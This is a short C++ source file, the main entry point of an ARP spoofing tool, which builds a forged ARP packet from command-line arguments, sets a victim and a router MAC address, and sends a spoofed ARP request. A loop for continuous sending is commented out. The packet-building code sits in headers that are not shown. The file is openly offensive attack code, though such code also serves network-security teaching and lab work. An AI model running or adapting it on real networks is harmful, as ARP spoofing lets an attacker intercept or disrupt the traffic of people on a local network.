/*
 * (c) 2018 Yating Zhou
 */
#include "arpAttack.h"
#include "FakeARPPacket.h"

int main(int argc, char** argv) 
{

    FakeARPPacket&& fakeARP = (4 == argc) ? FakeARPPacket(argv[1], argv[2], argv[3]) : FakeARPPacket();
    uint8_t victimMAC[] = { 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF };
    uint8_t routerMAC[] = { 0x00, 0x00, 0x00, 0x00, 0x00, 0x01 };
    fakeARP.setVictimMAC(victimMAC);
    fakeARP.setRouterMAC(routerMAC);
    // let's get started
    //while (true) 
        fakeARP.sendRequestPkt();
    return 0;
}